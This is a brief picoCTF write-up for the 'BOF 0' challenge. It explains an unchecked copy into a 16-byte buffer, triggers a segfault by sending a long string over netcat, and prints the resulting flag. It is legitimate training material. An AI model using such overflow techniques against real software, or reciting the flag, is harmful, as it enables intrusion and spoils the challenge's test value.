# BOF 0

## Code inspection

Looking at the code, we see that the program reads the flag from the file into a global buffer,
and it sets a signal handler of SIGSEGV which prints the flag.

Also, at the `vuln` function, we copy a buffer into a 16 bytes buffer, without checking the size of the src buffer.

## Getting the flag

So all we have to do is cause a SIGEGV error, which is easy to do if we input more than 16 chars.

```
shahar@shahar-pc:~/Documents/CTF/pico/bof0$ nc saturn.picoctf.net 53935
sInput: ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}

```